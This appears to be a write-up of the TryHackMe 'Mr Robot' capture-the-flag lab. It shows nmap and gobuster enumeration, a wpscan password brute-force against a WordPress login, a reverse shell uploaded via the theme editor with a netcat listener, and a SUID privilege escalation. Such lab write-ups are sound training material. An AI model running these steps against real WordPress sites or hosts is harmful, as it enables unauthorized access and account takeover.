# 🤖 Mr Robot CTF - TryHackMe

## 📌 Information

| Field          | Value                                                              |
| -------------- | ------------------------------------------------------------------ |
| **Machine**    | Mr Robot CTF                                                       |
| **Platform**   | TryHackMe                                                          |
| **Difficulty** | Medium                                                             |
| **OS**         | Linux                                                              |
| **Category**   | Web Enumeration / WordPress / File Analysis / Privilege Escalation |

---

# 🎯 Objective

Find the hidden keys, gain access to the Linux machine, and retrieve all three flags.

---

# 🛰️ Reconnaissance

The first step was identifying open ports and services.

### Scan

```bash
nmap -sC -sV -oN scan.txt MACHINE_IP
```

### Results

| Port | Service | Version    |
| ---- | ------- | ---------- |
| 80   | HTTP    | Apache     |
| 443  | HTTPS   | Apache SSL |

### Notes

* The machine hosted a website inspired by **Mr. Robot**.
* Web enumeration was required to discover hidden files and directories.

---

# 🔍 Enumeration

## Directory Enumeration

Using Gobuster:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Important files discovered:

```text
/robots.txt
/license
/wp-login.php
```

---

## Robots.txt

Checking:

```bash
curl http://MACHINE_IP/robots.txt
```

Revealed:

```text
fsocity.dic
key-1-of-3.txt
```

The first flag was obtained.

---

# 💥 Exploitation

## WordPress Enumeration

The website was running WordPress.

WPScan was used:

```bash
wpscan --url http://MACHINE_IP --enumerate u
```

A valid username was discovered:

```text
elliot
```

A password attack was performed using the discovered wordlist:

```bash
wpscan --url http://MACHINE_IP \
--usernames elliot \
--passwords fsocity.dic
```

Credentials were obtained.

---

# 🔓 WordPress Access

Login:

```text
/wp-login.php
```

After authentication, a reverse shell was uploaded through the WordPress theme editor.

Listener:

```bash
nc -lvnp 4444
```

A shell was received.

Current user:

```bash
whoami
```

Output:

```text
daemon
```

---

# ⬆️ Privilege Escalation

Enumeration:

```bash
find / -perm -4000 2>/dev/null
```

A vulnerable SUID binary was identified.

The binary was exploited to obtain elevated privileges.

Verify:

```bash
id
```

Output:

```text
uid=0(root)
```

---

# 🚩 Flags

## Key 1

```text
<key_1>
```

## Key 2

```text
<key_2>
```

## Key 3

```text
<key_3>
```

---

# 📚 What I Learned

* Web enumeration techniques.
* Robots.txt analysis.
* WordPress reconnaissance.
* Password attacks using discovered files.
* Exploiting WordPress administration panels.
* Reverse shell techniques.
* Linux privilege escalation.

---

# 🛠️ Tools Used

* Nmap
* Gobuster
* WPScan
* Hydra
* Netcat
* Linux CLI

---

# 📖 MITRE ATT&CK

| Technique | Description                           |
| --------- | ------------------------------------- |
| T1046     | Network Service Discovery             |
| T1083     | File and Directory Discovery          |
| T1110     | Brute Force                           |
| T1505.003 | Web Shell                             |
| T1068     | Exploitation for Privilege Escalation |

---

# 📷 Screenshots

Recommended screenshots:

* Nmap scan
* robots.txt
* Gobuster results
* WPScan enumeration
* WordPress login
* Reverse shell
* Privilege escalation
* All three keys

---

# ✅ Summary

Mr Robot CTF is a classic medium Linux machine focused on web enumeration and WordPress exploitation. It teaches the importance of information disclosure through files such as robots.txt, CMS enumeration, credential attacks, obtaining a reverse shell, and escalating privileges to retrieve all hidden keys.
